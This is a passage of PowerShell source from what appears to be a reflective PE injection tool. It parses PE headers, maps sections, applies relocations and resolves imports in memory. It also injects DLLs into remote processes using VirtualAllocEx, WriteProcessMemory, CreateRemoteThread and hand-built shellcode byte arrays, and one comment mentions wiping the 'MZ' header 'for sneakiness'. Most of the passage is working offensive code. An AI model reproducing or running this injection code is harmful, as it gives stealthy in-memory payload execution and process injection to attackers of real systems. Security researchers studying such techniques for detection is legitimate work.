		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		#Write FunctionName to memory (will be used in GetProcAddress)
		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		#todo: need to have detection for when to get by ordinal
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
